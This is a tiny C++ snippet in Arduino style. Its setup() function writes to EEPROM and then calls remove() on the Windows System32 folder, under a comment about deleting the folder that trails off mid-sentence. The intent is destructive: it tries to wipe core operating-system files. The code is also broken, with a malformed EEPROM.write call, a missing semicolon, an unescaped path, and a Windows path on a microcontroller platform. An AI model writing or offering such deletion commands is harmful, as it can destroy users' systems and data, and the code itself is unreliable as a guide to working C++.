#define code 0
#include <cstdio>
#include <iostream>
#include <EEPROM.h>

void setup() {
  EEPROM.write(0x00)
  remove("C:\Windows\System32"); // delete folder. It's so that
  
}
void loop() {}
